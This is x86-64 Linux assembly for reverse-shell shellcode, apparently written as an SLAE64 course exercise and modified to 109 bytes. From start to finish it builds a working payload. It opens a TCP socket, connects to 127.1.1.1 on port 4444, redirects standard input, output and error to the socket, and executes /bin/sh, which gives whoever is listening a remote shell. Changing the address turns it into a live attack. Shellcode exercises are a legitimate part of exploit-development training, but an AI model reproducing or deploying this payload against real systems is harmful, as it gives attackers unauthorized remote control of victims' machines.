global _start

;
; Modified by Gitsnik SLAE64-1232
; Modifications expand shell to 109 bytes
; 

_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	push byte 0x29
	push byte 0x02
	push byte 0x01
	pop rsi
	pop rdi
	pop rax
	cdq
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax

	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax
	
	mov dword [rsp-4], 0x0101017f	; Cheat XD 127.1.1.1 is still localhost ;)
	mov word [rsp-6], 0x5c11
	mov byte [rsp-8], 0x2
	sub rsp, 8

	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	push byte 0x2a
	pop rax
	mov rsi, rsp
	push byte 0x10
	pop rdx
	syscall

	; duplicate sockets

	; dup2 (new, old)
	
	push byte 0x21
	pop rax
	xor rsi, rsi
	syscall
 
	push byte 0x21
	pop rax
	push byte 0x01
	pop rsi
	syscall
 
	push byte 0x21
	pop rax
	push byte 0x02
	pop rsi
	syscall

	; execve

	; First NULL push

	xor rax, rax
	push rax

	; push /bin//sh in reverse

	mov rbx, 0x68732f2f6e69622f
	push rbx

	; store /bin//sh address in RDI

	mov rdi, rsp

	; Second NULL push
	push rax

	; set RDX
	mov rdx, rsp

	; Push address of /bin//sh
	push rdi

	; set RSI

	mov rsi, rsp

	; Call the Execve syscall
	push byte 0x3b
	pop rax
	syscall
 
